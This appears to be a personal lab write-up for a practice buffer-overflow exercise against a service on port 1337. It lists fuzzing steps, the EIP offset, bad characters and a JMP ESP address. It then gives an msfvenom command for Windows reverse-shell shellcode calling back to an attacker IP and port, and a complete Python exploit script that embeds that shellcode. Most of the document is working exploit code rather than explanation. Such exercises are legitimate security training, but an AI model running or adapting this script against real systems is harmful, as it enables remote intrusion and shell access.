## fuzzing
![[Pasted image 20210530143105.png]]

## offset

EIP: 356B4134

offset: 314

![[Pasted image 20210530143446.png]]

## bad chars

bad chars: `\x00\x16\x2f\xf4\xfd`
![[Pasted image 20210530143823.png]]

## jmp point

`!mona jmp -r esp -cpb "\x00\x16\x2f\xf4\xfd"`

`625011AF`

little endian: `\xaf\x11\x50\x62`

## exploit

`msfvenom -p windows/shell_reverse_tcp LHOST=10.17.4.208 LPORT=9001 EXITFUNC=thread -f c -a x86 --platform windows -b "\x00\x16\x2f\xf4\xfd"`

![[Pasted image 20210530144517.png]]

```python
import socket

ip = "10.10.171.241"
port = 1337

prefix = "OVERFLOW5 "
offset = 314
overflow = "A" * offset
retn = "\xaf\x11\x50\x62"
padding = "\x90" * 16
payload = (
"\xfc\xbb\x3e\xf0\xc7\x38\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\xc2\x18\x45\x38\x3a"
"\xd9\x2a\xb0\xdf\xe8\x6a\xa6\x94\x5b\x5b\xac\xf8\x57\x10\xe0"
"\xe8\xec\x54\x2d\x1f\x44\xd2\x0b\x2e\x55\x4f\x6f\x31\xd5\x92"
"\xbc\x91\xe4\x5c\xb1\xd0\x21\x80\x38\x80\xfa\xce\xef\x34\x8e"
"\x9b\x33\xbf\xdc\x0a\x34\x5c\x94\x2d\x15\xf3\xae\x77\xb5\xf2"
"\x63\x0c\xfc\xec\x60\x29\xb6\x87\x53\xc5\x49\x41\xaa\x26\xe5"
"\xac\x02\xd5\xf7\xe9\xa5\x06\x82\x03\xd6\xbb\x95\xd0\xa4\x67"
"\x13\xc2\x0f\xe3\x83\x2e\xb1\x20\x55\xa5\xbd\x8d\x11\xe1\xa1"
"\x10\xf5\x9a\xde\x99\xf8\x4c\x57\xd9\xde\x48\x33\xb9\x7f\xc9"
"\x99\x6c\x7f\x09\x42\xd0\x25\x42\x6f\x05\x54\x09\xf8\xea\x55"
"\xb1\xf8\x64\xed\xc2\xca\x2b\x45\x4c\x67\xa3\x43\x8b\x88\x9e"
"\x34\x03\x77\x21\x45\x0a\xbc\x75\x15\x24\x15\xf6\xfe\xb4\x9a"
"\x23\x50\xe4\x34\x9c\x11\x54\xf5\x4c\xfa\xbe\xfa\xb3\x1a\xc1"
"\xd0\xdb\xb1\x38\xb3\xe9\x54\x46\x93\x86\x54\x46\x30\x7e\xd0"
"\xa0\x5c\x90\xb4\x7b\xc9\x09\x9d\xf7\x68\xd5\x0b\x72\xaa\x5d"
"\xb8\x83\x65\x96\xb5\x97\x12\x56\x80\xc5\xb5\x69\x3e\x61\x59"
"\xfb\xa5\x71\x14\xe0\x71\x26\x71\xd6\x8b\xa2\x6f\x41\x22\xd0"
"\x6d\x17\x0d\x50\xaa\xe4\x90\x59\x3f\x50\xb7\x49\xf9\x59\xf3"
"\x3d\x55\x0c\xad\xeb\x13\xe6\x1f\x45\xca\x55\xf6\x01\x8b\x95"
"\xc9\x57\x94\xf3\xbf\xb7\x25\xaa\xf9\xc8\x8a\x3a\x0e\xb1\xf6"
"\xda\xf1\x68\xb3\xfb\x13\xb8\xce\x93\x8d\x29\x73\xfe\x2d\x84"
"\xb0\x07\xae\x2c\x49\xfc\xae\x45\x4c\xb8\x68\xb6\x3c\xd1\x1c"
"\xb8\x93\xd2\x34\xb8\x13\x2d\xb7"
)

postfix = ""

buffer = prefix + overflow + retn + padding + payload  + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```